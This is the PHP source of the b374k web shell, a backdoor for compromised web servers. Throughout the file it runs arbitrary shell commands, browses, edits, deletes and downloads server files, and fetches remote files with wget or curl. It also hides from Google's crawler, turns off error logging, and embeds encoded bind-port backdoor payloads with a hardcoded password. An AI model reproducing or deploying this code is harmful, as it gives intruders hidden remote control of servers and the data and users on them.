<?php 
/*********************************************************************************************************/
$auth_pass = ""; //password crypted with md5, default is 'Newbie3viLc063s'
/*********************************************************************************************************/
$color = "#00ff00";
$default_action = 'FilesMan';
@define('SELF_PATH', __FILE__);

/*********************************************************************************************************/
# Avoid google's crawler
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { header('HTTP/1.0 404 Not Found'); exit; }
/*********************************************************************************************************/

@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@define('VERSION', 'v.2013');
@define('TITLE', ':: b374k Newbie3viLc063s 2013 ::');

/*********************************************************************************************************/

if( get_magic_quotes_gpc() ) 
{
	function stripslashes_array($array) { return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); }
	$_POST = stripslashes_array($_POST);
}

function logout()
{
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	$page = $host='http://'.$_SERVER['SERVER_NAME'].'/'.$_SERVER['PHP_SELF'];
        echo '<center><span class="b1">The System Is Going To Down For LogOut Administrator Pages!!</scan></center>';
	?><?php print $page; ?><?php
	exit(0);
}

function myshellexec($command) {
if (!($p=popen("($command)2>&1","r"))) {
return 126;
}
while (!feof($p)) {
$line=fgets($p,1000);
$out .= $line;
}
pclose($p);
return $out;
}

function parsesort($sort) 
{ 
 $one = intval($sort); 
 $second = substr($sort,-1); 
 if ($second != "d") {$second = "a";} 
 return array($one,$second); 
}

$disablefunc = @ini_get("disable_functions");

function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<span style='color:#00FF1E'>".$disablefunc."</span>"; }
    else { return "<span style='color:#00FF1E'>NONE</span>"; }
  }
  
  function ex($cfe) {
$res = '';
if (!empty($cfe)) {
if(function_exists('exec')) {
@exec($cfe,$res);
$res = join("\n",$res);
} elseif(function_exists('shell_exec')) {
$res = @shell_exec($cfe);
} elseif(function_exists('system')) {
@ob_start();
@system($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(function_exists('passthru')) {
@ob_start();
@passthru($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(@is_resource($f = @popen($cfe,"r"))) {
$res = "";
while(!@feof($f)) { $res .= @fread($f,1024); }
@pclose($f);
} else { $res = "Ex() Disabled!"; }
}
return $res;
}


function showstat($stat) {
if ($stat=="on") { return "<b><font style='color:#00FF00'>ON</font></b>"; }
else { return "<b><font style='color:#DD4736'>OFF</font></b>"; }
}
function testperl() {
if (ex('perl -h')) { return showstat("on"); }
else { return showstat("off"); }
}
function testfetch() {
if(ex('fetch --help')) { return showstat("on"); }
else { return showstat("off"); }
}
function testwget() {
if (ex('wget --help')) { return showstat("on"); }
else { return showstat("off"); }
}
function testoracle() {
if (function_exists('ocilogon')) { return showstat("on"); }
else { return showstat("off"); }
}
function testpostgresql() {
if (function_exists('pg_connect')) { return showstat("on"); }
else { return showstat("off"); }
}
function testmssql() {
if (function_exists('mssql_connect')) { return showstat("on"); }
else { return showstat("off"); }
}
function testcurl() {
if (function_exists('curl_version')) { return showstat("on"); }
else { return showstat("off"); }
}
function testmysql() {
if (function_exists('mysql_connect')) { return showstat("on"); }
else { return showstat("off"); }
}

$quotes = get_magic_quotes_gpc();
if ($quotes == "1" or $quotes == "on")
{
$quot = "<font style='color:red'>ON</font>";
}
else
{
$quot = "<font style='color:green'>OFF</font>";
}

function printLogin() 
{
	?><?php
	exit;
}

if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
	{
	if( empty( $auth_pass ) || ( isset( $_POST['x'] ) && ( md5($_POST['x']) == $auth_pass ) ) )
		{ $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; }
	else
		{ printLogin(); }
	}

if(isset($_GET['dl']) && ($_GET['dl'] != ""))
	{ 
	$file 	= $_GET['dl']; 
	$filez 	= @file_get_contents($file); 
	header("Content-type: application/octet-stream"); 
	header("Content-length: ".strlen($filez)); 
	header("Content-disposition: attachment; 
	filename=\"".basename($file)."\";"); 
	echo $filez; 
	exit; 
	} 

elseif(isset($_GET['dlgzip']) && ($_GET['dlgzip'] != ""))
	{ 
	$file = $_GET['dlgzip']; 
	$filez = gzencode(@file_get_contents($file)); 
	header("Content-Type:application/x-gzip\n"); 
	header("Content-length: ".strlen($filez)); 
	header("Content-disposition: attachment; filename=\"".basename($file).".gz\";"); 
	echo $filez; exit; 
	} 

if(isset($_GET['img']))
	{ 
	@ob_clean(); 
	$d = magicboom($_GET['y']); 
	$f = $_GET['img']; 
	$inf = @getimagesize($d.$f); 
	$ext = explode($f,"."); 
	$ext = $ext[count($ext)-1]; 
	@header("Content-type: ".$inf["mime"]); 
	@header("Cache-control: public"); 
	@header("Expires: ".date("r",mktime(0,0,0,1,1,2030))); 
	@header("Cache-control: max-age=".(60*60*24*7)); 
	@readfile($d.$f); 
	exit; 
	} 
$ver = VERSION;

$DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");

if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") $safemode = TRUE; 
else $safemode 	= FALSE; 
$system 	= @php_uname(); 

if(strtolower(substr($system,0,3)) == "win") $win = TRUE; 
else $win 	= FALSE; 

if(isset($_GET['y']))
	{ if(@is_dir($_GET['view'])){ $pwd = $_GET['view']; @chdir($pwd); } else{ $pwd = $_GET['y']; @chdir($pwd); } } 

if(!$win)
	{ if(!$user = rapih(exe("whoami"))) $user = ""; if(!$id = rapih(exe("id"))) $id = ""; $prompt = $user." \$ "; $pwd = @getcwd().DIRECTORY_SEPARATOR; } 
else 
	{ 
	$user 	= @get_current_user(); 
	$id 	= $user; 
	$prompt = $user." &gt;"; 
	$pwd 	= realpath(".")."\\"; 
	$v 	= explode("\\",$d); 
	$v 	= $v[0]; 
	foreach (range("A","Z") as $letter) 
		{ 
		$bool = @is_dir($letter.":\\"); 
		if ($bool) 
			{ 
			$letters 	.= "<a href=\"?y=".$letter.":\\\">[ "; 
			if ($letter.":" != $v) {$letters .= $letter;} 
			else {$letters 	.= "<span class=\"gaya\">".$letter."</span>";} 
			$letters 	.= " ]</a> "; 
			} 
		} 
	}

if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE; 
else $posix = FALSE; 


        $bytes = disk_free_space("."); 
        $si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
        $base = 1024;
		$class = min((int)log($bytes , $base) , count($si_prefix) - 1);
        $totalspace_bytes = disk_total_space("."); 
    	$totalspace_si_prefixs = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
        $totalspace_bases = 1024;
		$totalspace_class = min((int)log($totalspace_bytes , $totalspace_bases) , count($totalspace_si_prefixs) - 1);
        $totalspace_show = sprintf('%1.2f' , $totalspace_bytes / pow($totalspace_bases,$totalspace_class)) . ' ' . $totalspace_si_prefixs[$totalspace_class] . '';
        $freespace_show = sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class] . '';
	$server_ip 	= @gethostbyname($_SERVER["HTTP_HOST"]); 
	$my_ip 		= $_SERVER['REMOTE_ADDR']; 
	$bindport 	= "55555"; 
	$bindport_pass 	= "Newbie3viLc063s"; 
	$pwds 		= explode(DIRECTORY_SEPARATOR,$pwd); 
	$pwdurl 	= ""; 
	for($i = 0 ; $i < sizeof($pwds)-1 ; $i++)
		{ 
		$pathz 	= ""; 
		for($j 	= 0 ; $j <= $i ; $j++)
			{ 
			$pathz .= $pwds[$j].DIRECTORY_SEPARATOR; 
			} 
		$pwdurl .= "<a href=\"?y=".$pathz."\">".$pwds[$i]." ".DIRECTORY_SEPARATOR." </a>"; 
		}

	if(isset($_POST['rename'])){ 
		$old = $_POST['oldname']; 
		$new = $_POST['newname']; 
		@rename($pwd.$old,$pwd.$new); 
		$file = $pwd.$new; 
		} 
	if(isset($_POST['chmod'])){ 
		$name = $_POST['name']; 
		$value = $_POST['newvalue']; 
		if (strlen($value)==3){
		$value = 0 . "" . $value;
		}
		@chmod($pwd.$name,octdec($value)); 
		$file = $pwd.$name;
		}
	if(isset($_POST['chmod_folder'])){ 
		$name = $_POST['name']; 
		$value = $_POST['newvalue']; 
		if (strlen($value)==3){
		$value = 0 . "" . $value;
		}
		@chmod($pwd.$name,octdec($value)); 
		$file = $pwd.$name;
		}
	$buff = $DISP_SERVER_SOFTWARE."<br />"; 
	$buff .= '<font style="color:#F58F78">'.$system.'</font><br />'; 
	if($id != "") $buff .= $id."<br />"; 
	$buff .= "Server IP : "."<span style='color:#FF8800'>$server_ip</span>"."<font> | </font>"."Your IP : "."<span style='color:#FF0000'>$my_ip</span>"."<br />";
        $buff .= "Total HDD Space : "."<span style='color:#00FF1E'>$totalspace_show</span>"."<font> | </font>"."Free HDD Space : "."<span style='color:#00FF1E'>$freespace_show</span>"."<br />";
		$buff .=  "Magic Quotes:$quot"."<br>";
		$buff .= "Disabled Functions: ".showdisablefunctions()."<br>";
		$buff .= "MySQL: ".testmysql()." MSSQL: ".testmssql()." Oracle: ".testoracle()." MSSQL: ".testmssql()." PostgreSQL: ".testpostgresql()." cURL: ".testcurl()." WGet: ".testwget()." Fetch: ".testfetch()." Perl: ".testperl()."<br>";
	if($safemode) $buff .= "safemode <span class=\"gaya\">ON</span><br />"; 
	else $buff .= "safemode <span class=\"gaya\">OFF<span><br />"; 
	$buff .= $letters."&nbsp;&gt;&nbsp;".$pwdurl; 

	function rapih($text){ return trim(str_replace("<br />","",$text)); } 

	function magicboom($text){ if (!get_magic_quotes_gpc()) { return $text; } return stripslashes($text); } 

	function showdir($pwd,$prompt)
	{ 
		$fname = array(); 
		$dname = array(); 
		if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE; 
		else $posix = FALSE; 
		$user = "????:????"; 
		if($dh = opendir($pwd))
			{ 
			while($file = readdir($dh))
				{ 
				if(is_dir($file))
					{ $dname[] = $file; } 
				elseif(is_file($file))
					{ $fname[] = $file; } 
				} 
			closedir($dh); 
			} 
		sort($fname); 
		sort($dname); 
		$path = @explode(DIRECTORY_SEPARATOR,$pwd); 
		$tree = @sizeof($path); 
		$parent = ""; 
		$buff = "<form action=\"?y=".$pwd."&amp;x=shell\" method=\"post\" style=\"margin:8px 0 0 0;\"> 
				<table class=\"cmdbox\" style=\"width:50%;\"> 
				<tr>
				<td>CMD@$prompt</td>
				<td><input onMouseOver=\"this.focus();\" id=\"cmd\" class=\"inputz\" type=\"text\" name=\"cmd\" style=\"width:400px;\" value=\"\" />
				<input class=\"inputzbut\" type=\"submit\" value=\"Execute !\" name=\"submitcmd\" style=\"width:80px;\" /></td>
				</tr> 
			</form> 
			<form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\"> 
				<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
				<tr>
				<td>view file/folder</td>
				<td><input onMouseOver=\"this.focus();\" id=\"goto\" class=\"inputz\" type=\"text\" name=\"view\" style=\"width:400px;\" value=\"".$pwd."\" />
				<input class=\"inputzbut\" type=\"submit\" value=\"Enter !\" name=\"submitcmd\" style=\"width:80px;\" /></td>
				</tr> 
			</form>
			</table>
			<table class=\"explore\"> 
				<tr>
				<th>name</th>
				<th style=\"width:80px;\">size</th>
				<th style=\"width:210px;\">owner:group</th>
				<th style=\"width:80px;\">perms</th>
				<th style=\"width:110px;\">modified</th>
				<th style=\"width:190px;\">actions</th>
				</tr> "; 

		if($tree > 2) for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR; 
		else $parent = $pwd; 
		foreach($dname as $folder)
			{ 
			if($folder == ".") 
				{ 
				if(!$win && $posix)
					{ 
					$name=@posix_getpwuid(@fileowner($folder)); 
					$group=@posix_getgrgid(@filegroup($folder)); 
					$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name']; 
					} 
				else { $owner = $user; } 
				$buff .= "<tr>
						<td><a href=\"?y=".$pwd."\">$folder</a></td>
						<td>-</td>
						<td style=\"text-align:center;\">".$owner."</td>
						<td><center>".get_perms($pwd)."</center></td>
						<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($pwd))."</td>
						<td><span id=\"titik1\">
							<a href=\"?y=$pwd&amp;edit=".$pwd."newfile.php\">newfile</a> 
							| <a href=\"javascript:tukar('titik1','titik1_form');\">newfolder</a>
						    </span> 
						<form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
							<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
							<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /> 
							<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go\" /> 
						</form>
						</td>
					</tr> "; 
				} 
			elseif($folder == "..") 
				{ 
				if(!$win && $posix)
					{ 
					$name=@posix_getpwuid(@fileowner($folder)); 
					$group=@posix_getgrgid(@filegroup($folder)); 
					$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name']; 
					} 
				else 	{ $owner = $user; } 
				$buff .= "<tr>
						<td>
						<a href=\"?y=".$parent."\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAadEVYdFNvZnR3YXJlAFBhaW50Lk5FVCB2My41LjEwMPRyoQAAAgZJREFUOE9jYKAF4I7ez6CVfVQvpOOiGcnm8yUdYVRvuWalvvjNTemqi01cUfuJN4Mv/QSjRsdNG81VH6/Lb/vzT6juWhtP/CFGokwQyD3DqNpxy1Zj5YdrCjv+/Zfb+uefSNPNNt6044QNECy5wKjUesNadcHr63Jrv/2XAWL5NV//W819sk9/6sMcMJ4GwXpTHiboTLpvpzXhnoxx/x0WBsHKywzyjdfNlKY9uSU1781/SSQsMef1f4nZr1DxrJcvJWe+XC45/XmIQv8DfgbBqqvScl1374r1Pfwv2gvDD4BsGIaIgeTF+h/9F5vw+I3YxMfrxCY+iQLyBRlEaq+JSjTdWCfRfPOPUMON/zAsDGSLNt38L4aGRZtvvhFrvrVOtOV2FBALMgjVXGMUb7qpIdNxZ51U193fIu13/4OwKBDrdj74bDbzwRNkbDrj/mXj6fdnGk6976/Xd58fHEPA0GaS7LirLdf3YI10/8NfolDviLU8WAQ01E66664tHHffNZftuasq33NPWLXjPgs8ikU77jFL9T3UkZ38ZI3U1Ge/xKc8+wf0Z5tI5z1GoIvQMQNQjEG07S5qEhHve8QsNfmpjvSM52ukZ736JT7pRRvQIMLpANkYoAZm6ZkvtDVmvVktWPK6SmL6K9IMABkmM/slk+qMN7Iy/W/kxKe/ISolk60IAJfcKhfb3kZPAAAAAElFTkSuQmCC' />  $folder</a></td>
						<td>-</td>
						<td style=\"text-align:center;\">".$owner."</td>
						<td><center>".get_perms($parent)."</center></td>
						<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($parent))."</td>
						<td><span id=\"titik2\">
							<a href=\"?y=$pwd&amp;edit=".$parent."newfile.php\">newfile</a> 
							| <a href=\"javascript:tukar('titik2','titik2_form');\">newfolder</a>
						    </span> 
						<form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
							<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
							<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /> 
							<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go\" /> 
						</form> 
						</td>
					</tr>"; 
				} 
			else 
				{ 
				if(!$win && $posix)
					{ 
					$name=@posix_getpwuid(@fileowner($folder)); 
					$group=@posix_getgrgid(@filegroup($folder)); 
					$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name']; 
					} 
				else { $owner = $user; } 
				$buff .= "<tr>
						<td>
						<a id=\"".clearspace($folder)."_link\" href=\"?y=".$pwd.$folder.DIRECTORY_SEPARATOR."\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAALGPC/xhBQAAAAlwSFlzAAAOwgAADsIBFShKgAAAABp0RVh0U29mdHdhcmUAUGFpbnQuTkVUIHYzLjUuMTAw9HKhAAACkUlEQVQ4T8WT2UvUURzFz2NRT5pab9ZDYZNMLjNq6rg1Fqhl5cw8qA+2kJmBgxKUhVpW4y6FZblkaRROpkQLITKG1ERhC5JMuaVmzuQWBD3e27nN0D/QQz/48P1+7znne+/LD/jvn14XtUYXqU+O0kebY2NiLfFxBkuiIcmSnJRiMe5MtexK3W02phjNSYnJZkN8gikmeoeJGRMzRr1OvxZbQzTBZCBUE+oJD4vwcJEnNibOY4hL8HCRJzEh6U/PMzc1d/j2CPc2TaibmSFNiGYT7hT7nbyU579y4dA6WXUsQNacCJR1RYGyoThINpZs8LFe1luD/mi2/ABZedBf2vL8fnSV+JdhohZPJ+sgv16H9NyGXOyGXH4AudLLetfLSh8rZ6Upj/JOMTNRAwfGa9A3Wetb0OlbQPPSffZdXpbZ/11Aj1qgMuPVeIYxG7rGbZAzTZDzHZDfeeOindxjf5M3tkMuMLTEswVqyjNzleEqSGZ74KrEZVcFn1QPMcfN7g4IPlPMN0N8a/IyR9xthJryTDVAuM5Bus6jBaPlKB85xW0XIaYb+bxrkLNXIL5UQxJVxRRfOM0LZnmz8iivyoyWwYaRUhS8LYL4WArxuRJiooq1AuLTGR9nOZd5z5Q2Ro/yqszIaVgxbEXmy8OQbwoh3pdAvrNCvD4KMXwccriAVVFIPR/iQzGhR3lfMMOsCY4chPVb8JPIwVzI5zmQA2aI/
izO7AezOVNzZEMM5VGnR3nJL0cuInErHcH2DHTb0+DszcSrh1lwPjb7sMD5hKj5kQlOpfXRY0+HszsDPZ0Z2IjcMKyuTsXm5jRob+yBtnUftG0HSBa07QqTt7bu92ote6FtToeWmS1HdFj1zz/zb9ZqmlZ866Y6AAAAAElFTkSuQmCC' />  [ $folder ]</a> 
						<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
							<input type=\"hidden\" name=\"oldname\" value=\"".$folder."\" style=\"margin:0;padding:0;\" /> 
							<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$folder."\" /> 
							<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> 
							<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
							onclick=\"tukar('".clearspace($folder)."_form','".clearspace($folder)."_link');\" />
						</form> 
						</td>
						<td>DIR</td>
						<td style=\"text-align:center;\">".$owner."</td>
						<td><center>
						<a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\">".get_perms($pwd.$folder)."</a>
							<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form3\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
							<input type=\"hidden\" name=\"name\" value=\"".$folder."\" style=\"margin:0;padding:0;\" /> 
							<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o', fileperms($pwd.$folder)), -4)."\" /> 
							<input class=\"inputzbut\" type=\"submit\" name=\"chmod_folder\" value=\"chmod\" /> 
							<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
							onclick=\"tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\" />
					</form>
					</center></td>
						<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($folder))."</td>
						<td><a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form');\">rename</a> 
						| <a href=\"?y=$pwd&amp;fdelete=".$pwd.$folder."\">delete</a>
						</td>
						</tr>"; 
				} 
			} 
		foreach($fname as $file)
			{ 
			$full = $pwd.$file; 
			if(!$win && $posix)
				{ 	
				$name=@posix_getpwuid(@fileowner($file)); 
				$group=@posix_getgrgid(@filegroup($file)); 
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name']; 
				} 
			else { $owner = $user; } 
			$buff .= "<tr>
					<td>
					<a id=\"".clearspace($file)."_link\" href=\"?y=$pwd&amp;view=$full\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAadEVYdFNvZnR3YXJlAFBhaW50Lk5FVCB2My41LjEwMPRyoQAAAXVJREFUOE+NkjtPwlAYhv0DLEZJSDQawQCTcYD/YWIkzqx0cHT1D7C4nMRFSdOWi4uzm9FFXcRBI3KxQGlLoYCAILyekhiRw6UneZKmeb8n79eepaW/43e5XFGfz0csvF4v8Xi2yfrGJllecRIa2xnLMo+OcDis6kYNulEfUdEMZD/KuH1IQ7y6RiQS0eZJAolkig6U/pHJy0i/vOPm/gnlikYl3ExJMJm6hFxWGQpFhUqyKJQqyNFGHMfptMnu5A5UkBrVZqkiLyt4zcrI5It4y8nY2w9ZkrVxSdBaoVozZ6LqtVGDu8dnHB2fgA4HGYHZaGE2TRj1BoqKhlNyxgriiSRan+2FmM0WYrzACiQq6HS7C2l3uhDjiSkC+vKr17OFNE0gSnH0+9+2sLLMRxRECYPBwBaCOEXACyKGw6EteEFiGgTOYzzsnguapSsExu+B4yB0qJYUlf5rcy5WxsrSYcfkdfavOp3RLbebzMPK0EH/7/APv59j7X+gJNIAAAAASUVORK5CYII%3D' />  $file</a> 
					<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
						<input type=\"hidden\" name=\"oldname\" value=\"".$file."\" style=\"margin:0;padding:0;\" /> 
						<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$file."\" /> 
						<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> 
						<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
							onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form');\" />
					</form>
					</td>
					<td>".ukuran($full)."</td>
					<td style=\"text-align:center;\">".$owner."</td>
					<td><center>
					<a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\">".get_perms($full)."</a>
					<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form2\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
						<input type=\"hidden\" name=\"name\" value=\"".$file."\" style=\"margin:0;padding:0;\" /> 
						<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o', fileperms($full)), -4)."\" /> 
						<input class=\"inputzbut\" type=\"submit\" name=\"chmod\" value=\"chmod\" /> 
						<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
							onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\" />
					</form></center></td>
					<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($full))."</td> 
					<td>
					<a href=\"?y=$pwd&amp;edit=$full\">edit</a> 
					| <a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form');\">rename</a>
					| <a href=\"?y=$pwd&amp;delete=$full\">delete</a> 
					| <a href=\"?y=$pwd&amp;dl=$full\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$full\">gz</a>)
					</td>
				</tr>"; 
			} 
		$buff .= "</table>"; return $buff; 
	} 

	function ukuran($file)
	{ 
		if($size = @filesize($file))
			{ 	
			if($size <= 1024) return $size; 
			else
				{ 
				if($size <= 1024*1024) 
					{ $size = @round($size / 1024,2);; return "$size kb"; } 
				else { $size = @round($size / 1024 / 1024,2); return "$size mb"; } 
				} 
			} 
		else return "???"; 
	} 

	function exe($cmd)
	{ 
		if(function_exists('system')) 
			{ 
			@ob_start(); 
			@system($cmd); 
			$buff = @ob_get_contents();
			@ob_end_clean(); 
			return $buff; 
			} 
		elseif(function_exists('exec')) 
			{ 
			@exec($cmd,$results); 
			$buff = ""; 
			foreach($results as $result)
				{ $buff .= $result; } 
			return $buff; 
			} 
		elseif(function_exists('passthru')) 
			{ 
			@ob_start(); 
			@passthru($cmd); 
			$buff = @ob_get_contents(); 
			@ob_end_clean(); 
			return $buff; 
			} 
		elseif(function_exists('shell_exec'))
			{ 
			$buff = @shell_exec($cmd); 
			return $buff; 
			} 
	} 

	function tulis($file,$text)
	{ 
	$textz = gzinflate(base64_decode($text)); 
	if($filez = @fopen($file,"w")) 
		{ 
		@fputs($filez,$textz); 
		@fclose($file); 
		} 
	} 
	
	function tulis_2($file,$text)
	{ 
	$textz = base64_decode($text); 
	if($filez = @fopen($file,"w")) 
		{ 
		@fputs($filez,$textz); 
		@fclose($file); 
		} 
	} 

	function ambil($link,$file) 
	{ 
	if($fp = @fopen($link,"r"))
		{ 
		while(!feof($fp)) 
			{ 
			$cont.= @fread($fp,1024); 
			} 
		@fclose($fp); 
		$fp2 = @fopen($file,"w"); 
		@fwrite($fp2,$cont); 
		@fclose($fp2); 
		} 
	} 

	function which($pr)
	{ 
	$path = exe("which $pr"); 
	if(!empty($path)) 
		{ return trim($path); } 
	else { return trim($pr); } 
	} 

	function download($cmd,$url)
	{ 
	$namafile = basename($url); 
	switch($cmd) 
		{ 
		case 'wwget': exe(which('wget')." ".$url." -O ".$namafile); break; 
		case 'wlynx': exe(which('lynx')." -source ".$url." > ".$namafile); break; 
		case 'wfread' : ambil($wurl,$namafile);break; 
		case 'wfetch' : exe(which('fetch')." -o ".$namafile." -p ".$url);break; 
		case 'wlinks' : exe(which('links')." -source ".$url." > ".$namafile);break; 
		case 'wget' : exe(which('GET')." ".$url." > ".$namafile);break; 
		case 'wcurl' : exe(which('curl')." ".$url." -o ".$namafile);break; 
		default: break; } 
	return $namafile; 
	} 

	function get_perms($file) 
	{ 
		if($mode=@fileperms($file))
			{ 
			$perms=''; 
			$perms .= ($mode & 00400) ? 'r' : '-'; 
			$perms .= ($mode & 00200) ? 'w' : '-'; 
			$perms .= ($mode & 00100) ? 'x' : '-'; 
			$perms .= ($mode & 00040) ? 'r' : '-'; 
			$perms .= ($mode & 00020) ? 'w' : '-'; 
			$perms .= ($mode & 00010) ? 'x' : '-'; 
			$perms .= ($mode & 00004) ? 'r' : '-'; 
			$perms .= ($mode & 00002) ? 'w' : '-'; 
			$perms .= ($mode & 00001) ? 'x' : '-'; 
			return $perms; 
			} 
		else return "??????????"; 
	} 

	function clearspace($text){ return str_replace(" ","_",$text); } 

	$port_bind_bd_c="bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jvf +fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa+pRCWtgmQrJE P/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41ZZ dKTIWKb0hoUwmUAcwtFt6+m+EXKVJVtRHGAC07vV/ez2cfwvXSpticytkoYlVglX/fNiuAzDE6VL 3TfVrw4o2P1senPzsJrOfoRjl9cfhWjvIatzRvNvn7+s5o8Pt9OvURzWZV94dQgleag0C3wQVKug Uq2FTFnjDzvxAXphx9cXQfxr6PcthLEo/8a8q8B9LgpkQ7oOgKMbvNeThHMsbSOO69IA0l05YpXk HDT8HxrV0F4LizUWfE+M2SudfgiiYbONxiStebrgyIjfqDJG07AWiAzYBc9LivU3MVpGFV2x1J4W tyxAnivYY8HVFsEqWF+/f7sBk2NRQKcDA/JtsE5MDm9EUG+MhcFqkpX0HmxGbqbkdBTMldaHRsUL ZeoDeOSFBvpefCfXhflOpgTkvJ+jtKiR7vLohYKCqS2ZmMRj4Z5gQZfSiMbi6iqkdnHarEEXYuk6 uPtTdumsr0HC4q5rrzNifV7sC3ZWUmq+LVlVa5OfQjTanZYQO+Uf"; 
	$port_bind_bd_pl="ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr1 NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzfwg tNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQkD e/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM0 LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRrVo vaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjGB +hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8="; 

